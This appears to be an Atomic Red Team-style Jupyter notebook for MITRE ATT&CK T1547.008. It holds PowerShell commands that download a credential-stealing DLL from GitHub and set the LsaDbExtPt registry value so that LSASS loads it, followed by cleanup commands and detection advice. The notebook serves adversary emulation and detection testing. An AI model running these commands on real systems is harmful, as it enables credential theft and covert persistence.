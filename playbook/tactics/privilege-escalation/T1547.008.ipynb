{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "c5e0e3ee",
   "metadata": {},
   "source": "# T1547.008 - LSASS Driver\nAdversaries may modify or add LSASS drivers to obtain persistence on compromised systems. The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process.(Citation: Microsoft Security Subsystem)\n\nAdversaries may target LSASS drivers to obtain persistence. By either replacing or adding illegitimate drivers (e.g., [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574)), an adversary can use LSA operations to continuously execute malicious payloads."
  },
  {
   "cell_type": "markdown",
   "id": "8462a772",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "8be86175",
   "metadata": {},
   "source": "### Atomic Test #1 - Modify Registry to load Arbitrary DLL into LSASS - LsaDbExtPt\nThe following Atomic will modify an undocumented registry key that may be abused to load a arbitrary DLL into LSASS. \n\nUpon execution, the registry key will be modified and a value will contain the path to the DLL. \nReference: https://blog.xpnsec.com/exploring-mimikatz-part-1/ and source https://github.com/oxfemale/LogonCredentialsSteal\nNote that if any LSA based protection is enabled, this will most likely not be successful with LSASS.exe loading the DLL.\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: lsass_lib.dll must exist on disk at specified location (#{dll_path})\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\lsass_lib.dll\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/oxfemale/LogonCredentialsSteal/raw/53e74251f397ddeab2bd1348c3ff26d702cfd836/lsass_lib/x64/Release/lsass_lib.dll\" -UseBasicParsing -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\lsass_lib.dll\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2d3950f2",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1547.008 -TestNumbers 1 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "06ea6a1e",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nNew-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS -Name LsaDbExtPt -Value \"PathToAtomicsFolder\\..\\ExternalPayloads\\lsass_lib.dll\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b801cfa8",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1547.008 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "2a5a5d35",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS\" -Name \"LsaDbExtPt\" -ErrorAction Ignore | Out-Null\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ffaf7761",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1547.008 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "cc577943",
   "metadata": {},
   "source": "## Detection\nWith LSA Protection enabled, monitor the event logs (Events 3033 and 3063) for failed attempts to load LSA plug-ins and drivers. (Citation: Microsoft LSA Protection Mar 2014) Also monitor DLL load operations in lsass.exe. (Citation: Microsoft DLL Security)\n\nUtilize the Sysinternals Autoruns/Autorunsc utility (Citation: TechNet Autoruns) to examine loaded drivers associated with the LSA. "
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}